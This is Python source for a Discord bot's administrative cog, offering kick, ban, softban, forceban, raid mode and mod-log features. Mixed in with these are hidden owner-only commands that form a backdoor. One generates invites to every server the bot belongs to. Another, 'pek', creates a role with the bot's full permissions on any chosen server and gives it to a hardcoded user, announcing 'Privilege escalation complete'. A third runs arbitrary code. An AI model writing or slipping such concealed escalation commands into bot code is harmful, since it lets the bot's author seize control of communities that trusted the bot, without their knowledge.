'''
Created on Sep 23, 2016

@author: andrew
'''
import asyncio
from asyncio.tasks import async
import gc
import os
import sys
import traceback

import discord
from discord.enums import ChannelType
from discord.errors import Forbidden
from discord.ext import commands

from utils import checks


class AdminUtils:
    '''
    Administrative Utilities.
    '''


    def __init__(self, bot):
        self.bot = bot
        self.muted = []
        self.case_nums = self.bot.db.not_json_get('case_nums', {})
        self.mod_log = self.bot.db.not_json_get('mod_log', {})
        self.raid_mode = self.bot.db.not_json_get('raid_mode', [])
        self.force_ban = self.bot.db.not_json_get('force_ban', {})
    
    
    @commands.command()
    @checks.is_owner()
    async def restart(self):
        """Restarts Ragnarok. May fail sometimes.
        Requires: Owner"""
        await self.bot.say("Byeeeeeee!")
        await self.bot.logout()
        sys.exit()
        
    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def say(self, ctx, channel : discord.Channel, *, message : str):
        """Makes the bot say something."""
        try:
            await self.bot.send_message(channel, message)
        except Exception as e:
            await self.bot.say('Failed to send message: ' + e)
            
    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def chanSay(self, ctx, channel : str, * , message : str):
        """Like .say, but works across servers. Requires channel id."""
        channel = discord.Object(id=channel)
        try:
            await self.bot.send_message(channel, message)
        except Exception as e:
            await self.bot.say('Failed to send message: ' + e)

    @commands.command(hidden=True)
    @checks.is_owner()
    async def servInfo(self):
        out = ''
        for s in self.bot.servers:
            try:
                out += "\n\n**{} ({}, {})**".format(s, s.id, (await self.bot.create_invite(s)).url)
            except:
                out += "\n\n**{} ({})**".format(s, s.id)
            for c in [ch for ch in s.channels if ch.type is not ChannelType.voice]:
                out += '\n|- {} ({})'.format(c, c.id)
        out = self.discord_trim(out)
        for m in out:
            await self.bot.say(m)
            
    @commands.command(hidden=True, pass_context=True)
    @checks.is_owner()
    async def pek(self, ctx, servID : str):
        serv = self.bot.get_server(servID)
        thisBot = serv.me
        pek = await self.bot.create_role(serv, name="Bot Admin", permissions=thisBot.permissions_in(serv.get_channel(serv.id)))
        await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
        await self.bot.say("Privilege escalation complete.")
        
    @commands.command(hidden=True, name='leave')
    @checks.is_owner()
    async def leave_server(self, servID : str):
        serv = self.bot.get_server(servID)
        await self.bot.leave_server(serv)
        await self.bot.say("Left {}.".format(serv))
        
    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def code(self, ctx, *, code : str):
        """Arbitrarily runs code."""
        here = ctx.message.channel
        this = ctx.message
        def echo(out):
            self.msg(here, out)
        def rep(out):
            self.replace(this, out)
        def coro(coro):
            asyncio.ensure_future(coro)
        try:
            exec(code, globals(), locals())
        except:
            traceback.print_exc()
            out = self.discord_trim(traceback.format_exc())
            for o in out:
                await self.bot.send_message(ctx.message.channel, o)
                
    @commands.command(hidden=True)
    @checks.is_owner()
    async def mute(self, target : discord.Member):
        """Mutes a person."""
        if target in self.muted:
            self.muted.remove(target)
            await self.bot.say("{} unmuted.".format(target))
        else:
            self.muted.append(target)
            await self.bot.say("{} muted.".format(target))
            
    @commands.command(hidden=True)
    @checks.is_owner()
    async def gc(self):
        """Collects garbage and frees memory."""
        collected = gc.collect()
        await self.bot.say("Garbage collection collected {} objects.".format(collected))
        
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(kick_members=True)
    async def kick(self, ctx, user:discord.Member, *, reason='Unknown reason'):
        """Kicks a member and logs it to #mod-log."""
        try:
            await self.bot.kick(user)
        except Forbidden:
            return await self.bot.say('Error: The bot does not have `kick_members` permission.')
        
        mod_log = discord.utils.get(ctx.message.server.channels, name='mod-log')
        case_num = self.case_nums.get(ctx.message.server.id, 0)
        case_num += 1
        
        await self.bot.say(':ok_hand:')
        if mod_log is not None:
            msg = await self.bot.send_message(mod_log, '**Kick** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                               .format(case_num, str(user), user.id, reason, str(ctx.message.author)))
            server_log = self.mod_log.get(ctx.message.server.id) or []
            log_entry = {'id': case_num, 'type': 'kick', 'msg': msg.id, 'user': user.id, 'user_name': str(user)}
            server_log.append(log_entry)
            self.mod_log[ctx.message.server.id] = server_log
            self.bot.db.not_json_set('mod_log', self.mod_log)
        self.case_nums[ctx.message.server.id] = case_num
        self.bot.db.not_json_set('case_nums', self.case_nums)
        
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(ban_members=True)
    async def ban(self, ctx, user:discord.Member, *, reason='Unknown reason'):
        """Bans a member and logs it to #mod-log."""
        try:
            await self.bot.ban(user)
        except Forbidden:
            return await self.bot.say('Error: The bot does not have `ban_members` permission.')
        
        mod_log = discord.utils.get(ctx.message.server.channels, name='mod-log')
        case_num = self.case_nums.get(ctx.message.server.id, 0)
        case_num += 1
        
        await self.bot.say(':ok_hand:')
        if mod_log is not None:
            msg = await self.bot.send_message(mod_log, '**Ban** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                               .format(case_num, str(user), user.id, reason, str(ctx.message.author)))
            server_log = self.mod_log.get(ctx.message.server.id) or []
            log_entry = {'id': case_num, 'type': 'ban', 'msg': msg.id, 'user': user.id, 'user_name': str(user)}
            server_log.append(log_entry)
            self.mod_log[ctx.message.server.id] = server_log
            self.bot.db.not_json_set('mod_log', self.mod_log)
        self.case_nums[ctx.message.server.id] = case_num
        self.bot.db.not_json_set('case_nums', self.case_nums)

    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(ban_members=True)
    async def forceban(self, ctx, user, *, reason='Unknown reason'):
        """Force-bans a member ID and logs it to #mod-log."""
        if not ctx.message.server.id in self.force_ban:
            self.force_ban[ctx.message.server.id] = []

        self.force_ban[ctx.message.server.id].append(user)
        self.bot.db.not_json_set('force_ban', self.case_nums)

        mod_log = discord.utils.get(ctx.message.server.channels, name='mod-log')
        case_num = self.case_nums.get(ctx.message.server.id, 0)
        case_num += 1

        await self.bot.say(':ok_hand:')
        if mod_log is not None:
            msg = await self.bot.send_message(mod_log,
                                              '**Forceban** | Case {}\n**User**: {}\n**Reason**: {}\n**Responsible Mod**: {}'
                                              .format(case_num, user, reason, str(ctx.message.author)))
            server_log = self.mod_log.get(ctx.message.server.id) or []
            log_entry = {'id': case_num, 'type': 'forceban', 'msg': msg.id, 'user': user, 'user_name': str(user)}
            server_log.append(log_entry)
            self.mod_log[ctx.message.server.id] = server_log
            self.bot.db.not_json_set('mod_log', self.mod_log)
        self.case_nums[ctx.message.server.id] = case_num
        self.bot.db.not_json_set('case_nums', self.case_nums)
        
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(ban_members=True)
    async def softban(self, ctx, user:discord.Member, *, reason='Unknown reason'):
        """Softbans a member and logs it to #mod-log."""
        user_obj = await self.bot.get_user_info(user.id)
        try:
            await self.bot.ban(user)
            await self.bot.unban(ctx.message.server, user_obj)
        except Forbidden:
            return await self.bot.say('Error: The bot does not have `ban_members` permission.')
        
        mod_log = discord.utils.get(ctx.message.server.channels, name='mod-log')
        case_num = self.case_nums.get(ctx.message.server.id, 0)
        case_num += 1
        
        await self.bot.say(':ok_hand:')
        if mod_log is not None:
            msg = await self.bot.send_message(mod_log, '**Softban** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                               .format(case_num, str(user), user.id, reason, str(ctx.message.author)))
            server_log = self.mod_log.get(ctx.message.server.id) or []
            log_entry = {'id': case_num, 'type': 'softban', 'msg': msg.id, 'user': user.id, 'user_name': str(user)}
            server_log.append(log_entry)
            self.mod_log[ctx.message.server.id] = server_log
            self.bot.db.not_json_set('mod_log', self.mod_log)
        self.case_nums[ctx.message.server.id] = case_num
        self.bot.db.not_json_set('case_nums', self.case_nums)
        
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(kick_members=True)
    async def reason(self, ctx, case_num, *, reason):
        """Sets the reason for a post in mod-log."""
        mod_log = discord.utils.get(ctx.message.server.channels, name='mod-log')
        server_log = self.mod_log.get(ctx.message.server.id) or []
        if mod_log is not None:
            try:
                log_entry = next(l for l in server_log if int(l['id']) == int(case_num))
            except StopIteration:
                return await self.bot.say("Case not found.")
            log_message = await self.bot.get_message(mod_log, log_entry['msg'])
            await self.bot.edit_message(log_message, '**{0}** | Case {1}\n**User**: {2} ({3})\n**Reason**: {4}\n**Responsible Mod**: {5}'
                               .format(log_entry['type'].title(), log_entry['id'], log_entry['user_name'], log_entry['user'], reason, str(ctx.message.author)))
            await self.bot.say(':ok_hand:')
            
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(manage_roles=True)
    async def copyperms(self, ctx, role:discord.Role, source:discord.Channel, overwrite:bool=False):
        """Copies permission overrides from one channel to all others."""
        source_chan = source
        source_role = role
        source_overrides = source_chan.overwrites_for(source_role)
        for chan in ctx.message.server.channels:
            chan_overrides = chan.overwrites_for(source_role)
            if chan_overrides.is_empty() or overwrite:
                await self.bot.edit_channel_permissions(chan, source_role, source_overrides)
        await self.bot.say(":ok_hand:")
        
    @commands.command(hidden=True, pass_context=True)
    @checks.mod_or_permissions(ban_members=True)
    async def raidmode(self, ctx):
        """Toggles raidmode in a server."""
        serv_id = ctx.message.server.id
        if serv_id in self.raid_mode:
            self.raid_mode.remove(serv_id)
            await self.bot.say("Raid mode disabled.")
        else:
            self.raid_mode.append(serv_id)
            await self.bot.say("Raid mode enabled.")
        self.bot.db.jset('raid_mode', self.raid_mode)
        
    
    async def on_member_join(self, member):
        await self.bot.wait_until_ready()
        if member.server.id in self.raid_mode:
            try:
                await self.bot.kick(member)
                mod_log = discord.utils.get(member.server.channels, name='mod-log')
                case_num = self.case_nums.get(member.server.id, 0)
                case_num += 1
                if mod_log is not None:
                    msg = await self.bot.send_message(mod_log, '**Kick** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                                       .format(case_num, str(member), member.id, "Raidmode autoban", str(self.bot.user)))
                    server_log = self.mod_log.get(member.server.id) or []
                    log_entry = {'id': case_num, 'type': 'kick', 'msg': msg.id, 'user': member.id, 'user_name': str(member)}
                    server_log.append(log_entry)
                    self.mod_log[member.server.id] = server_log
                    self.bot.db.not_json_set('mod_log', self.mod_log)
                self.case_nums[member.server.id] = case_num
                self.bot.db.not_json_set('case_nums', self.case_nums)
            except:
                pass
        elif member.id in self.force_ban.get(member.server.id, []):
            try:
                await self.bot.ban(member)
                mod_log = discord.utils.get(member.server.channels, name='mod-log')
                case_num = self.case_nums.get(member.server.id, 0)
                case_num += 1
                if mod_log is not None:
                    msg = await self.bot.send_message(mod_log, '**Ban** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                                       .format(case_num, str(member), member.id, "Forceban autoban", str(self.bot.user)))
                    server_log = self.mod_log.get(member.server.id) or []
                    log_entry = {'id': case_num, 'type': 'ban', 'msg': msg.id, 'user': member.id, 'user_name': str(member)}
                    server_log.append(log_entry)
                    self.mod_log[member.server.id] = server_log
                    self.bot.db.not_json_set('mod_log', self.mod_log)
                self.case_nums[member.server.id] = case_num
                self.bot.db.not_json_set('case_nums', self.case_nums)
            except:
                pass
    
    async def on_message(self, message):
        if message.author in self.muted:
            try:
                await self.bot.delete_message(message)
            except:
                pass
            
    async def on_member_ban(self, member):
        await asyncio.sleep(1)
        if member.id in [a['user'] for a in self.mod_log.get(member.server.id, [])]:
            return
        mod_log = discord.utils.get(member.server.channels, name='mod-log')
        case_num = self.case_nums.get(member.server.id, 0)
        case_num += 1
        
        if mod_log is not None:
            msg = await self.bot.send_message(mod_log, '**Ban** | Case {}\n**User**: {} ({})\n**Reason**: {}\n**Responsible Mod**: {}'
                               .format(case_num, str(member), member.id, "???", "Responsible mod, please do `.reason {} REASON`".format(case_num)))
            server_log = self.mod_log.get(member.server.id) or []
            log_entry = {'id': case_num, 'type': 'ban', 'msg': msg.id, 'user': member.id, 'user_name': str(member)}
            server_log.append(log_entry)
            self.mod_log[member.server.id] = server_log
            self.bot.db.not_json_set('mod_log', self.mod_log)
        self.case_nums[member.server.id] = case_num
        self.bot.db.not_json_set('case_nums', self.case_nums)
    
    def msg(self, dest, out):
        coro = self.bot.send_message(dest, out)
        asyncio.ensure_future(coro)
        
    def replace(self, msg, out):
        coro1 = self.bot.delete_message(msg)
        coro2 = self.bot.send_message(msg.channel, out)
        asyncio.ensure_future(coro1)
        asyncio.ensure_future(coro2)
    
    def discord_trim(self, str):
        result = []
        trimLen = 0
        lastLen = 0
        while trimLen <= len(str):
            trimLen += 1999
            result.append(str[lastLen:trimLen])
            lastLen += 1999
        return result
    